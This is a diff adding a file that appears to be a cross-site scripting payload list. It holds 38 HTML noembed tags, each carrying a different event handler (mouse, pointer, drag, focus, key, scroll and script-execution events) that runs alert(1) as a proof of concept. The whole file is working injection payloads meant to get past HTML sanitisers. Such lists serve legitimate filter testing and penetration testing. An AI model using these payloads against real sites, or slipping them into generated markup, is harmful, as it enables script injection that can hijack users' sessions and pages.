@@ -1,0 +1,38 @@
+<noembed contenteditable onbeforeinput=alert(1)>test
+<noembed draggable="true" ondrag="alert(1)" style=display:block>test</noembed>
+<noembed draggable="true" ondragend="alert(1)" style=display:block>test</noembed>
+<noembed draggable="true" ondragenter="alert(1)" style=display:block>test</noembed>
+<noembed draggable="true" ondragleave="alert(1)" style=display:block>test</noembed>
+<noembed draggable="true" ondragstart="alert(1)" style=display:block>test</noembed>
+<noembed id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></noembed>
+<noembed id=x tabindex=1 onfocus=alert(1)></noembed>
+<noembed id=x tabindex=1 onfocusin=alert(1)></noembed>
+<noembed onafterscriptexecute=alert(1)><script>1</script>
+<noembed onbeforescriptexecute=alert(1)><script>1</script>
+<noembed onblur=alert(1) id=x tabindex=1 style=display:block>test</noembed><input value=clickme>
+<noembed onclick="alert(1)" style=display:block>test</noembed>
+<noembed oncontextmenu="alert(1)" style=display:block>test</noembed>
+<noembed oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<noembed oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<noembed ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</noembed>
+<noembed onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</noembed><input value=clickme>
+<noembed onkeydown="alert(1)" contenteditable style=display:block>test</noembed>
+<noembed onkeypress="alert(1)" contenteditable style=display:block>test</noembed>
+<noembed onkeyup="alert(1)" contenteditable style=display:block>test</noembed>
+<noembed onmousedown="alert(1)" style=display:block>test</noembed>
+<noembed onmouseenter="alert(1)" style=display:block>test</noembed>
+<noembed onmouseleave="alert(1)" style=display:block>test</noembed>
+<noembed onmousemove="alert(1)" style=display:block>test</noembed>
+<noembed onmouseout="alert(1)" style=display:block>test</noembed>
+<noembed onmouseover="alert(1)" style=display:block>test</noembed>
+<noembed onmouseup="alert(1)" style=display:block>test</noembed>
+<noembed onmousewheel=alert(1) style=display:block>requires scrolling
+<noembed onpointerdown=alert(1) style=display:block>XSS</noembed>
+<noembed onpointerenter=alert(1) style=display:block>XSS</noembed>
+<noembed onpointerleave=alert(1) style=display:block>XSS</noembed>
+<noembed onpointermove=alert(1) style=display:block>XSS</noembed>
+<noembed onpointerout=alert(1) style=display:block>XSS</noembed>
+<noembed onpointerover=alert(1) style=display:block>XSS</noembed>
+<noembed onpointerrawupdate=alert(1) style=display:block>XSS</noembed>
+<noembed onpointerup=alert(1) style=display:block>XSS</noembed>
+<noembed onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></noembed>
